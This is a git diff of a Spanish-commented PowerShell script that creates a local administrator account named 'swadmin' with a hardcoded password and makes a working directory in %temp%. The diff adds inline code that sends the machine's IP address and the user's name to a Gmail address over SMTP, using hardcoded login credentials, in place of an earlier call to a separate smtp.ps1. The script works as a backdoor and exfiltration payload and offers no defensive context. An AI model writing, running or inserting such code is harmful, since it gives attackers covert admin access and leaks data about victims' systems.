@@ -10,7 +10,14 @@ function random_text {
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
-$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
+ 
+#enviando ip por smtp
+$email = "robertogonzalez6662@gmail.com";
+$password = "BobEsponja123$!";$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress  | Out-String;
+$subject = "$env:UserName logs";
+$smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
+$smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
+$smtp.Send($email, $email, $subject, $ip);
 
 #Creando administrador local
 function Create-NewLocalAdmin {
@@ -36,9 +43,6 @@ function Create-NewLocalAdmin {
 $NewLocalAdmin = "swadmin"
 $Password = (ConvertTo-SecureString "Melon123$!" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
-
-#Enviando dirección ip por correo
-./smtp.ps1
 
 #Crear directorio en %temp%
 mkdir $path
